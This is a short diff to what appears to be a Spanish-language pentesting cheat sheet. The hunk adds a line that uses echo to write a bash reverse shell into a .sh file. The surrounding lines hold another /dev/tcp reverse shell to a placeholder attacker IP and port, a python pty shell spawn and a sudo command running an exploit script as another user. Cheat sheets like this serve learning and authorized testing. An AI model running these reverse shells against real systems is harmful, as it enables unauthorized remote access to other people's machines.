@@ -225,6 +225,8 @@ sudo -u (usuario) /usr/bin/python /direccion/exploit.py [ejecuta exploit.py como
 
 #!/bin/bash [le indica al sistema operativo qué intérprete usar para ejecutar el script]
 
+echo "bash -i >& /dev/tcp/IP/PUERTO 0>&1" > archivo.sh [usando echo coloca una reverse shell en un archivo sh]
+
 bash -c 'exec bash -i &>/dev/tcp/IpAtacante/Puerto <&1' [ejecuta una shell interactiva en el sistema víctima y redirige toda su entrada y salida a traves de una conexion TCP hacia la IP y puerto del atacante]
 
 python3 -c 'import pty;pty.spawn("/bin/bash");' [para invocar una shell si esta python3 instalado]
